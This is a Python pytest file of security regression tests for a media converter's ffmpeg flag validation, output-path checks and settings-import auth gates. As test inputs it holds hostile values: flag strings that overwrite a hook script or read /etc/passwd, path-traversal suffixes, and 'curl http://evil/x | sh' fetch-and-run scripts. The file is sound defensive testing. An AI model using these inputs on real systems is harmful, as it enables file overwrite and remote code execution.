"""v0.9.157: settings that can run code or write files.

C4: custom ffmpeg flags were spliced into the command unchecked and could be
set without password auth, so `-f rawvideo /app/data/hook.sh` (a second
output) overwrote any file the container could write.
F3: /settings/import wrote every key verbatim, bypassing the post-conversion
script gate, path validators and auth settings.
Output naming: target_resolution and filename_suffix were put into the output
filename unchecked, so "x/../../tmp/y" moved the output out of the folder.
"""
import json
import shutil
import subprocess
from pathlib import Path
from types import SimpleNamespace

import aiosqlite
import pytest
import pytest_asyncio

from backend.converter import (
    build_disc_output_filename,
    convert_file,
    get_output_path,
    parse_custom_ffmpeg_flags,
)


@pytest.mark.parametrize("flags", [
    "-movflags +faststart",
    "-tune grain",
    "-x265-params aq-mode=3:psy-rd=2.0",
    "-r 24000/1001",
    '-vf "scale=iw/2:-2"',
    "-metadata:s:a:0 language=eng",
    "-af loudnorm=I=-16:TP=-1.5:LRA=11",
    "-max_muxing_queue_size 9999 -map_metadata 0",
    "-aq-strength 0.75 -ss 00:01:02.500",
])
def test_ordinary_flags_are_accepted(flags):
    assert parse_custom_ffmpeg_flags(flags)


@pytest.mark.parametrize("flags", [
    "-f rawvideo /app/data/hook.sh",       # second output, the C4 exploit
    "-c:v libx265 out.mkv extra",           # bare token after a value = output file
    "-tune grain extra.mkv",
    "-an evil.sh",                          # -an takes no value: an output file
    "-an file:evil.mkv",
    "-an data/out.mkv",                     # relative to ffmpeg's working folder
    "-an out+.mkv",
    "-vn out%d.png",
    "-an .mkv",
    "-sdp_file a.sdp",
    "-stats_enc_post enc.log",
    "-y -i /etc/passwd",
    "-vf movie=/etc/passwd",
    "-x265-params csv=/tmp/x.csv",
    "-vstats_file stats.txt",
    "-progress progress.txt",
    "-passlogfile pass",
    "-dump_attachment:t att",
    "-attach font.ttf",
    "-filter_complex_script graph.txt",
    "-/filter:v graph.txt",
    "tune grain",                           # first token must be an option
    '-metadata title="unterminated',
])
def test_flags_that_add_outputs_or_touch_files_are_rejected(flags):
    with pytest.raises(ValueError):
        parse_custom_ffmpeg_flags(flags)


@pytest.mark.asyncio
async def test_convert_refuses_stored_unsafe_flags_before_encoding(tmp_path):
    src = tmp_path / "Movie (2009) 1080p WEB h264.mkv"
    src.write_bytes(b"not really a video")
    result = await convert_file(
        str(src), "libx265", 10.0,
        pre_settings={"custom_ffmpeg_flags": "-f rawvideo /app/data/hook.sh"},
    )
    assert result["success"] is False
    assert result["error_key"] == "errors.customFlagsRejected"
    assert src.read_bytes() == b"not really a video"


@pytest.mark.parametrize("suffix,resolution", [
    ("/../../tmp/pwned", None),
    ("\\..\\x", None),
    ("", "x/../../tmp/pwned"),
])
def test_output_path_stays_in_the_source_folder(tmp_path, suffix, resolution):
    src = tmp_path / "Movie (2009) 2160p WEB h264.mkv"
    out = Path(get_output_path(str(src), suffix=suffix, encoder="nvenc", target_resolution=resolution))
    assert out.parent == tmp_path
    assert "/" not in out.name and "\\" not in out.name


@pytest.mark.asyncio
async def test_disc_output_ignores_unknown_target_resolution(tmp_path):
    disc = tmp_path / "Movie (2009)"
    (disc / "BDMV").mkdir(parents=True)
    (disc / "BDMV" / "index.bdmv").write_bytes(b"INDX0200")
    probe = {"video_width": 1920, "video_height": 1080, "audio_tracks": []}
    out = Path(await build_disc_output_filename(
        str(disc / "BDMV" / "index.bdmv"), "bdmv", probe, encoder="nvenc",
        target_resolution="x/../../tmp/pwned",
    ))
    assert out == disc / "Movie (2009) 1080p Bluray h265.mkv"


# --- settings routes ---------------------------------------------------------

def _settings_route():
    pytest.importorskip("apscheduler")
    try:
        import backend.routes.settings as settings_route
    except (ImportError, RuntimeError) as exc:
        pytest.skip(f"settings routes not importable here: {exc}")
    return settings_route


async def _set(db_path: str, key: str, value: str) -> None:
    async with aiosqlite.connect(db_path) as db:
        await db.execute(
            "INSERT INTO settings (key, value) VALUES (?, ?) "
            "ON CONFLICT(key) DO UPDATE SET value=excluded.value", (key, value))
        await db.commit()


async def _get(db_path: str, key: str):
    async with aiosqlite.connect(db_path) as db:
        async with db.execute("SELECT value FROM settings WHERE key = ?", (key,)) as cur:
            row = await cur.fetchone()
    return row[0] if row else None


@pytest.fixture
def route(test_db, monkeypatch):
    settings_route = _settings_route()
    monkeypatch.setattr(settings_route, "DB_PATH", test_db)
    return settings_route


@pytest.mark.asyncio
async def test_custom_flags_need_password_auth(route, test_db):
    from backend.models import SettingsUpdate
    with pytest.raises(Exception) as exc:
        await route.update_encoding_settings(SettingsUpdate(custom_ffmpeg_flags="-tune grain"))
    assert getattr(exc.value, "code", None) == "settings.customFlagsNeedAuth"
    assert await _get(test_db, "custom_ffmpeg_flags") in (None, "")


# What api_key_auth records for a request signed in with the UI password.
PASSWORD_SESSION = SimpleNamespace(state=SimpleNamespace(auth_method="session"))


@pytest.mark.asyncio
async def test_custom_flags_are_validated_when_auth_is_on(route, test_db):
    from backend.models import SettingsUpdate
    await _set(test_db, "auth_enabled", "true")
    with pytest.raises(Exception) as exc:
        await route.update_encoding_settings(
            SettingsUpdate(custom_ffmpeg_flags="-f rawvideo /app/data/hook.sh"), PASSWORD_SESSION)
    assert getattr(exc.value, "code", None) == "settings.customFlagsInvalid"
    await route.update_encoding_settings(SettingsUpdate(custom_ffmpeg_flags="-tune grain"), PASSWORD_SESSION)
    assert await _get(test_db, "custom_ffmpeg_flags") == "-tune grain"


@pytest.mark.asyncio
async def test_unchanged_guarded_values_do_not_block_other_saves(route, test_db):
    """The Settings page sends every field on save. Values stored earlier
    (before the guard, or while auth was on) must not make unrelated saves
    fail once auth is off."""
    from backend.models import SettingsUpdate
    await _set(test_db, "custom_ffmpeg_flags", "-tune grain")
    await _set(test_db, "post_conversion_script", "/scripts/notify.sh")
    await route.update_encoding_settings(SettingsUpdate(
        custom_ffmpeg_flags="-tune grain",
        post_conversion_script="/scripts/notify.sh",
        nvenc_cq=24,
    ))
    assert await _get(test_db, "nvenc_cq") == "24"


@pytest.mark.asyncio
async def test_import_cannot_set_auth_or_secrets(route, test_db):
    await route.import_settings(route.ImportSettingsRequest(settings={
        "auth_enabled": "false",
        "auth_password_hash": "x",
        "api_key": "attacker",
        "session_secret": "attacker",
        "plex_poster_shrink_done": "true",   # internal state, not a setting
        "nvenc_cq": "23",
    }))
    assert await _get(test_db, "api_key") != "attacker"
    assert await _get(test_db, "session_secret") != "attacker"
    assert await _get(test_db, "auth_password_hash") in (None, "")
    assert await _get(test_db, "plex_poster_shrink_done") is None
    assert await _get(test_db, "nvenc_cq") == "23"


@pytest.mark.asyncio
@pytest.mark.parametrize("key,value,code", [
    ("post_conversion_script", "curl evil | sh", "settings.postScriptNeedsAuth"),
    ("custom_ffmpeg_flags", "-tune grain", "settings.customFlagsNeedAuth"),
    ("backup_folder", "/", "settings.pathIsRoot"),
])
async def test_import_runs_the_settings_validators(route, test_db, key, value, code):
    with pytest.raises(Exception) as exc:
        await route.import_settings(route.ImportSettingsRequest(
            settings={key: value, "nvenc_cq": "23"}))
    assert getattr(exc.value, "code", None) == code
    assert await _get(test_db, key) in (None, "")
    assert await _get(test_db, "nvenc_cq") is None, "a rejected import writes nothing"


@pytest.mark.asyncio
async def test_import_skips_unsafe_media_dirs(route, test_db, tmp_path):
    good = tmp_path / "Movies"
    good.mkdir()
    res = await route.import_settings(route.ImportSettingsRequest(
        media_dirs=[{"path": "/", "label": ""}, {"path": str(good), "label": "Movies"}]))
    assert res["dirs_count"] == 1
    async with aiosqlite.connect(test_db) as db:
        async with db.execute("SELECT path FROM media_dirs") as cur:
            assert [r[0] for r in await cur.fetchall()] == [str(good.resolve())]


@pytest.mark.asyncio
async def test_export_import_round_trip(route, test_db):
    await _set(test_db, "always_keep_languages", json.dumps(["eng", "ice"]))
    await _set(test_db, "rename_movie_file_pattern", "{title} ({year})")
    await _set(test_db, "run_hours", json.dumps({"enabled": True, "hours": [1, 2]}))
    resp = await route.export_settings()
    body = "".join([chunk async for chunk in resp.body_iterator])
    exported = json.loads(body)

    async with aiosqlite.connect(test_db) as db:
        await db.execute("DELETE FROM settings WHERE key IN "
                         "('always_keep_languages', 'rename_movie_file_pattern', 'run_hours')")
        await db.commit()
    await route.import_settings(route.ImportSettingsRequest(**exported))

    assert json.loads(await _get(test_db, "always_keep_languages")) == ["eng", "ice"]
    assert await _get(test_db, "rename_movie_file_pattern") == "{title} ({year})"
    assert json.loads(await _get(test_db, "run_hours")) == {"enabled": True, "hours": [1, 2]}


# --- through the real auth middleware --------------------------------------

@pytest_asyncio.fixture
async def client(route, test_db, monkeypatch):
    from httpx import AsyncClient, ASGITransport
    from backend import main as main_module
    import backend.database as db_module
    monkeypatch.setattr(db_module, "DB_PATH", test_db)
    monkeypatch.setattr(main_module, "DB_PATH", test_db)
    monkeypatch.setitem(main_module._auth_cache, "checked_at", 0)
    await _set(test_db, "auth_enabled", "true")
    await _set(test_db, "auth_username", "admin")
    await _set(test_db, "auth_password_hash", main_module._hash_password("correct horse"))
    await _set(test_db, "session_secret", "s" * 64)
    await _set(test_db, "api_key", "INTEGRATION-KEY")
    async with AsyncClient(transport=ASGITransport(app=main_module.app), base_url="http://test") as ac:
        yield ac


@pytest.mark.asyncio
@pytest.mark.parametrize("key,value", [
    ("post_conversion_script", "curl http://evil/x | sh"),
    ("custom_ffmpeg_flags", "-tune grain"),
])
async def test_the_api_key_alone_cannot_set_code_running_settings(client, test_db, key, value):
    """The API key is baked into the NZBGet/SABnzbd scripts Shrinkerr
    generates; it must not be enough to make the server run commands."""
    r = await client.put("/api/settings/encoding", headers={"X-Api-Key": "INTEGRATION-KEY"}, json={key: value})
    assert r.status_code == 403 and r.json()["code"] == "settings.needsPasswordLogin"
    assert await _get(test_db, key) in (None, "")

    r = await client.post("/api/auth/login", json={"username": "admin", "password": "correct horse"})
    assert r.status_code == 200
    r = await client.put("/api/settings/encoding", json={key: value})
    assert r.status_code == 200, r.text
    assert await _get(test_db, key) == value


def _has_libx265() -> bool:
    if not shutil.which("ffmpeg"):
        return False
    out = subprocess.run(["ffmpeg", "-hide_banner", "-encoders"], capture_output=True, text=True).stdout
    return "libx265" in out


@pytest.mark.asyncio
@pytest.mark.skipif(not _has_libx265(), reason="needs ffmpeg with libx265")
async def test_encode_runs_in_an_empty_folder(test_db, tmp_path, monkeypatch):
    """A relative file name in the flags (here x265's csv=) must not land in
    the server's working folder."""
    workdir = tmp_path / "app"
    workdir.mkdir()
    monkeypatch.chdir(workdir)
    src = tmp_path / "Show - S01E01 - 1080p WEB h264.mkv"
    subprocess.run(["ffmpeg", "-v", "error", "-f", "lavfi", "-i", "testsrc2=size=320x240:rate=25:duration=2",
                    "-c:v", "libx264", "-preset", "ultrafast", str(src)], check=True)
    result = await convert_file(
        str(src), "libx265", 2.0, override_libx265_preset="ultrafast",
        pre_settings={"custom_ffmpeg_flags": "-x265-params csv=x265.csv"},
    )
    assert result["success"], result.get("error")
    assert list(workdir.iterdir()) == []
